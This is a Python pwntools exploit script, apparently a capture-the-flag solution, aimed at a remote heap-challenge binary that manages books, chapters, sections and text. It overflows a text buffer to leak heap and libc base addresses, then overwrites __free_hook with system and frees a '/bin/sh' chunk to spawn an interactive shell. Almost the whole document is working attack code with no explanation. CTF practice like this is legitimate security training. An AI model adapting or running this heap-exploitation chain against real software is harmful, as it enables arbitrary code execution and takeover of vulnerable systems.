from os import system
from pwn import *

# context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27333)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('pwn')


def add_chapter(name):
    io.sendlineafter('Your choice:', '1')
    io.sendafter('Chapter name:', name)


def add_section(chapter_name, section_name):
    io.sendlineafter('Your choice:', '2')
    io.sendafter('Which chapter do you want to add into:', chapter_name)
    section_addr = int(io.recvline()[2:-1], 16)
    io.sendafter('Section name:', section_name)
    return section_addr


def add_text(section_name, text_size, text):
    io.sendlineafter('Your choice:', '3')
    io.sendafter('Which section do you want to add into:', section_name)
    io.sendlineafter('How many chapters you want to write:', str(text_size))
    io.sendafter('Text:', text)


def delete_chapter(chapter_name):
    io.sendlineafter('Your choice:', '4')
    io.sendafter('Chapter name:', chapter_name)


def delete_section(section_name):
    io.sendlineafter('Your choice:', '5')
    io.sendafter('Section name:', section_name)


def delete_text(section_name):
    io.sendlineafter('Your choice:', '6')
    io.sendafter('Section name:', section_name)


def show():
    io.sendlineafter('Your choice:', '7')


def edit(Type, name, data):
    io.sendlineafter('Your choice:', '8')
    io.sendlineafter('What to update?(Chapter/Section/Text):', Type)
    if Type == 'Chapter':
        io.sendafter('New Chapter name:', name)
    else:
        io.sendafter('Section name:', name)
        if Type == 'Section':
            io.sendafter('New Section name:', data)
        else:
            io.sendafter('New Text:', data)


def leak():
    global heap_base, libc_base
    io.sendafter('Name of the book you want to create: ', 'book0')
    add_chapter('chapter0')
    heap_base = add_section('chapter0', 'section0') - 0x130
    add_text('section0', 0xa8, 'text0')
    add_section('chapter0', 'section1')
    delete_text('section0')
    add_section('chapter0', 'section2')
    add_text('section0', 0x68, 'text0aaa')
    show()
    io.recvuntil('      Text:text0aaa')
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('heap_base: ' + hex(heap_base))
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    payload = b'/bin/sh'.ljust(0x60, b'\x00')
    payload += p64(0x70) + p64(0x41)
    payload += b'section1' + b'\x00' * 0x18
    payload += p64(__free_hook)
    edit('Text', 'section0', payload)
    edit('Text', 'section1', p64(system))
    delete_section('section0')
    io.interactive()


if __name__ == '__main__':
    leak()
    pwn()
